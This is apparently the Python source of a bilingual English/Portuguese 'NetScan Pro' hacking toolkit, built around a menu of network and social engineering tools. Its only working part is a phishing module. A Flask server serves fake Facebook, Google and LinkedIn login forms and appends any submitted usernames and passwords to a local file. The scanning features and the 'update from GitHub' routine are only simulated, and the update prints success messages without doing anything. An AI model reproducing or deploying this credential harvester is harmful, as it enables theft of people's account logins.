import os
import subprocess
from flask import Flask, request, render_template_string
import time
from colorama import init, Fore, Style

app = Flask(__name__)

# Páginas de login falsas (templates HTML simplificados)
login_pages = {
    '1': '''
    <form method="POST" action="/capture">
        <h2>Facebook Login</h2>
        <label>Email:</label>
        <input type="text" name="username"><br>
        <label>Password:</label>
        <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    ''',
    '2': '''
    <form method="POST" action="/capture">
        <h2>Google Login</h2>
        <label>Email:</label>
        <input type="text" name="username"><br>
        <label>Password:</label>
        <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    ''',
    '3': '''
    <form method="POST" action="/capture">
        <h2>LinkedIn Login</h2>
        <label>Email:</label>
        <input type="text" name="username"><br>
        <label>Password:</label>
        <input type="password" name="password"><br>
        <button type="submit">Login</button>
    </form>
    '''
}

# Rota para exibir a página de login falsa
@app.route('/')
def login():
    return render_template_string(login_pages[website_choice])

# Rota para capturar as credenciais
@app.route('/capture', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']
    with open('captured_credentials.txt', 'a') as f:
        f.write(f"Website: {website_choice}, Username: {username}, Password: {password}\n")
    return "Credentials captured. You can close this window."

def clone_website(choice, language):
    global website_choice
    website_choice = choice

    app.run(port=5000)
    if language == '1':
        print("Server started. Open http://localhost:5000 in your browser.")
    else:
        print("Servidor iniciado. Abra http://localhost:5000 no seu navegador.")

def fake_login_pages(language):
    clear_console()
    if language == '1':
        print("Choose a website to clone for fake login:")
        print("1. Facebook")
        print("2. Google")
        print("3. LinkedIn")
        print("0. Back to Phishing Menu")
    else:
        print("Escolha um site para clonar para login falso:")
        print("1. Facebook")
        print("2. Google")
        print("3. LinkedIn")
        print("0. Voltar para o Menu de Phishing")

    choice = input("Enter your choice: ")

    if choice == '0':
        return
    elif choice in ['1', '2', '3']:
        clone_website(choice, language)
    else:
        handle_invalid_option(language)

# Funções existentes omitidas para brevidade

# Função para limpar a tela do console
def clear_console():
    """Clears the console screen."""
    os.system('cls' if os.name == 'nt' else 'clear')

# Função para exibir a mensagem de boas-vindas
def welcome_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Welcome to the NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Bem-vindo à ferramenta NetScan Pro!".center(50))
    print()
    time.sleep(2)
    clear_console()

# Função para exibir a mensagem de despedida
def goodbye_message(language):
    clear_console()
    if language == '1':
        print(Fore.GREEN + Style.BRIGHT + "Thank you for using NetScan Pro tool!".center(50))
    else:
        print(Fore.GREEN + Style.BRIGHT + "Obrigado por usar a ferramenta NetScan Pro!".center(50))
    time.sleep(3)
    print()

# Função para lidar com opções inválidas
def handle_invalid_option(language):
    clear_console()
    if language == '1':
        print(Fore.RED + "Invalid option. Please choose again.")
    else:
        print(Fore.RED + "Opção inválida. Por favor, escolha novamente.")
    time.sleep(2)

# Função para exibir a mensagem de carregamento
def loading_screen():
    print("Loading...")
    time.sleep(3)
    clear_console()
    print(Style.BRIGHT + "@wbrunnno".center(100))
    time.sleep(1)

# Função para atualizar a ferramenta do GitHub
def update_tool_from_github(language):
    clear_console()
    print(Fore.YELLOW + Style.BRIGHT + "Updating NetScan Pro tool from GitHub...")

    try:
        # Simulando o processo de atualização (substitua com lógica real)
        print("Checking for updates...")
        time.sleep(2)
        print("Downloading updates...")
        time.sleep(3)
        print("Applying updates...")
        time.sleep(2)
        print("Updates applied successfully!")

        # Reiniciando a ferramenta após a atualização
        print("Restarting NetScan Pro tool...")
        time.sleep(2)
        clear_console()
        print("NetScan Pro tool has been updated and restarted.")

        time.sleep(2)
    except Exception as e:
        print(Fore.RED + f"Error updating the tool: {e}")

    # Retorna ao menu principal após a atualização
    time.sleep(3)
    main_menu(language)

# Função para exibir o menu principal
def main_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Main Menu ".center(50, '-'))
            print("1. Network Tools")
            print("2. Social Engineering Tools")
            print("3. Update Tool")
            print("0. Exit")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu Principal ".center(50, '-'))
            print("1. Ferramentas de Rede")
            print("2. Ferramentas de Engenharia Social")
            print("3. Atualizar Ferramenta")
            print("0. Sair")

        choice = input("Choose an option: ")

        if choice == '0':
            goodbye_message(language)
            break
        elif choice == '1':
            network_tools_menu(language)
        elif choice == '2':
            social_engineering_tools(language)
        elif choice == '3':
            update_tool_from_github(language)
        else:
            handle_invalid_option(language)

# Função para o menu de ferramentas de rede
def network_tools_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Network Tools ".center(50, '-'))
            print("1. Scan a Network")
            print("2. Scan Own Network")
            print("3. Vulnerability Scanning")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Rede ".center(50, '-'))
            print("1. Escanear uma Rede")
            print("2. Escanear a Própria Rede")
            print("3. Escaneamento de Vulnerabilidades")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            enter_network(language)
            manual_mode(language)
        elif choice == '2':
            scan_own_network(language)
        elif choice == '3':
            vulnerability_scan_mode(language)
        else:
            handle_invalid_option(language)

# Função para entrar com o nome da rede
def enter_network(language):
    clear_console()
    if language == '1':
        return input("Enter the network name: ")
    else:
        return input("Digite o nome da rede: ")

# Função para o modo manual
def manual_mode(language):
    clear_console()
    if language == '1':
        print("Scanning network in manual mode...")
    else:
        print("Escanenado rede no modo manual...")

    # Lógica para o modo manual (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para escanear a própria rede
def scan_own_network(language):
    clear_console()
    if language == '1':
        print("Scanning own network...")
    else:
        print("Escanenando a própria rede...")

    # Lógica para escanear a própria rede (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o escaneamento de vulnerabilidades
def vulnerability_scan_mode(language):
    clear_console()
    if language == '1':
        print("Vulnerability scanning...")
    else:
        print("Escaneamento de vulnerabilidades...")

    # Lógica para o escaneamento de vulnerabilidades (simulado)
    time.sleep(3)
    input("Press Enter to continue...")

# Função para o menu de ferramentas de engenharia social
def social_engineering_tools(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Social Engineering Tools ".center(50, '-'))
            print("1. Phishing")
            print("2. Spear Phishing")
            print("3. Pretexting")
            print("4. Baiting")
            print("5. Tailgating/Piggybacking")
            print("6. Fake Quizzes and Forms")
            print("7. Vishing")
            print("0. Back to Main Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Ferramentas de Engenharia Social ".center(50, '-'))
            print("1. Phishing")
            print("2. Spear Phishing")
            print("3. Pretexting")
            print("4. Baiting")
            print("5. Tailgating/Piggybacking")
            print("6. Quizzes e Formulários Falsos")
            print("7. Vishing")
            print("0. Voltar ao Menu Principal")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            phishing_menu(language)
        else:
            handle_invalid_option(language)

# Função para o menu de phishing
def phishing_menu(language):
    while True:
        clear_console()
        if language == '1':
            print(Fore.YELLOW + Style.BRIGHT + " Phishing Menu ".center(50, '-'))
            print("1. Fake Login Pages")
            print("0. Back to Social Engineering Tools Menu")
        else:
            print(Fore.YELLOW + Style.BRIGHT + " Menu de Phishing ".center(50, '-'))
            print("1. Páginas de Logins Falsas")
            print("0. Voltar para o Menu de Ferramentas de Engenharia Social")

        choice = input("Choose an option: ")

        if choice == '0':
            return
        elif choice == '1':
            fake_login_pages(language)
        else:
            handle_invalid_option(language)

# Função principal para iniciar o programa
def start_program():
    init(autoreset=True)
    language = input("Choose language (1. English / 2. Portuguese): ")

    if language not in ['1', '2']:
        print("Invalid choice. Defaulting to English.")
        language = '1'

    welcome_message(language)
    main_menu(language)

# Início do programa
if __name__ == "__main__":
    start_program()
